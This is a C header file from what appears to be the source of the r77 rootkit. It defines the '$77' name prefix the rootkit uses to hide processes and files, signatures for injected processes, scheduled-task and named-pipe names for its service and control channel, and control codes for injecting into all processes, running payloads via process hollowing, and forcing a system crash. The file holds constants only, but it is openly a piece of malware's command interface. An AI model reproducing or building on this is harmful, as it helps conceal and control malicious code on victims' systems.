#ifndef _R77DEF_H
#define _R77DEF_H

// These preprocessor definitions must match the constants in r77Const.cs

/// <summary>
/// The prefix for name based hiding (e.g. processes, files, etc...).
/// </summary>
#define HIDE_PREFIX								L"$77"
/// <summary>
/// The length of the hide prefix, excluding the terminating null character.
/// </summary>
#define HIDE_PREFIX_LENGTH						(sizeof(HIDE_PREFIX) / sizeof(WCHAR) - 1)

/// <summary>
/// r77 header signature: The process is injected with the r77 DLL.
/// </summary>
#define R77_SIGNATURE							0x7277
/// <summary>
/// r77 header signature: The process is the r77 service process.
/// </summary>
#define R77_SERVICE_SIGNATURE					0x7273
/// <summary>
/// r77 header signature: The process is an r77 helper file (e.g. TestConsole.exe).
/// </summary>
#define R77_HELPER_SIGNATURE					0x7268

/// <summary>
/// Name for the scheduled task that starts the r77 service for 32-bit processes.
/// </summary>
#define R77_SERVICE_NAME32						HIDE_PREFIX L"svc32"
/// <summary>
/// Name for the scheduled task that starts the r77 service for 64-bit processes.
/// </summary>
#define R77_SERVICE_NAME64						HIDE_PREFIX L"svc64"

/// <summary>
/// Name for the named pipe that notifies the 32-bit r77 service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME32				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc32"
/// <summary>
/// Name for the named pipe that notifies the 64-bit r77 service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME64				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc64"

/// <summary>
/// Name for the named pipe that receives commands from external processes.
/// </summary>
#define CONTROL_PIPE_NAME						L"\\\\.\\pipe\\" HIDE_PREFIX L"control"
/// <summary>
/// Name for the internally used named pipe of the 64-bit r77 service that receives redirected commands from the 32-bit r77 service.
/// <para>Do not use! Always use CONTROL_PIPE_NAME.</para>
/// </summary>
#define CONTROL_PIPE_REDIRECT64_NAME			L"\\\\.\\pipe\\" HIDE_PREFIX L"control_redirect64"

/// <summary>
/// Specifies a list of processes that will not be injected.
/// By default, this list includes processes that are known to cause problems.
/// To customize this list, add custom entries and recompile.
/// </summary>
#define PROCESS_EXCLUSIONS						{ L"MSBuild.exe" }
// Example: { L"MSBuild.exe", L"your_app.exe", L"another_app.exe" }

/// <summary>
/// The control code that terminates the r77 service.
/// </summary>
#define CONTROL_R77_TERMINATE_SERVICE			0x1001
/// <summary>
/// The control code that uninstalls r77.
/// </summary>
#define CONTROL_R77_UNINSTALL					0x1002
/// <summary>
/// The control code that temporarily pauses injection of new processes.
/// </summary>
#define CONTROL_R77_PAUSE_INJECTION				0x1003
/// <summary>
/// The control code that resumes injection of new processes.
/// </summary>
#define CONTROL_R77_RESUME_INJECTION			0x1004
/// <summary>
/// The control code that injects r77 into a specific process, if it is not yet injected.
/// </summary>
#define CONTROL_PROCESSES_INJECT				0x2001
/// <summary>
/// The control code that injects r77 into all processes that are not yet injected.
/// </summary>
#define CONTROL_PROCESSES_INJECT_ALL			0x2002
/// <summary>
/// The control code that detaches r77 from a specific process.
/// </summary>
#define CONTROL_PROCESSES_DETACH				0x2003
/// <summary>
/// The control code that detaches r77 from all processes.
/// </summary>
#define CONTROL_PROCESSES_DETACH_ALL			0x2004
/// <summary>
/// The control code that executes a file using ShellExecute.
/// </summary>
#define CONTROL_USER_SHELLEXEC					0x3001
/// <summary>
/// The control code that executes an executable using process hollowing.
/// </summary>
#define CONTROL_USER_RUNPE						0x3002
/// <summary>
/// The control code that triggers a BSOD.
/// </summary>
#define CONTROL_SYSTEM_BSOD						0x4001

#endif